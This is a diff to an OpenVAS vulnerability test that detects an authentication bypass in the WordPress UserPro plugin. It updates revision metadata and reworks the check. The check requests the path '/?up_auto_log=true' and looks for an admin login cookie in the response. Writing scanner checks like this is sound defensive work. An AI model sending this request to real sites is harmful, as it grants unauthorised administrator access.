@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_userpro_auth_bypass.nasl 7858 2017-11-22 08:08:27Z emoss $
+# $Id: gb_wordpress_userpro_auth_bypass.nasl 7886 2017-11-23 13:43:37Z jschulte $
 #
 # WordPress UserPro Plugin Authentication Bypass
 #
@@ -28,8 +28,8 @@
 if( description )
 {
   script_oid("1.3.6.1.4.1.25623.1.0.113055");
-  script_version("$Revision: 7858 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-11-22 09:08:27 +0100 (Wed, 22 Nov 2017) $");
+  script_version("$Revision: 7886 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-11-23 14:43:37 +0100 (Thu, 23 Nov 2017) $");
   script_tag(name:"creation_date", value:"2017-11-21 14:19:20 +0100 (Tue, 21 Nov 2017)");
   script_tag(name:"cvss_base", value:"6.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
@@ -73,18 +73,20 @@ if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
 
 exploit = "/?up_auto_log=true";
 
+if( ! dir = get_app_location( port: port, cpe: CPE ) ) exit( 0 );
 
-foreach dir( make_list_unique( "", "/blog", "/wordpress", "/wordpress-mu", cgi_dirs( port:port ) ) ) {
+if( dir == "/" ) dir = "";
 
-  url = dir + exploit;
-  req = http_get( item: url, port: port );
-  resp = http_keepalive_send_recv( data: req, port: port );
+# For future notice: http_vuln_ceck is not sufficient, reports NOT_VULN
 
-  if( '<a href="/logout">' >< resp ) {
-    report = report_vuln_url(  port: port, url: url );
-    security_message( data: report, port: port );
-    exit( 0 );
-  }
+url = dir + exploit;
+req = http_get( port: port, item: url );
+resp = http_keepalive_send_recv( port: port, data: req );
+
+if( eregmatch( pattern: "Set-Cookie: wordpress_logged_in[^;]*admin", string: resp, icase: TRUE ) ) {
+  report = report_vuln_url(  port: port, url: url );
+  security_message( data: report, port: port );
+  exit( 0 );
 }
 
 exit( 99 );
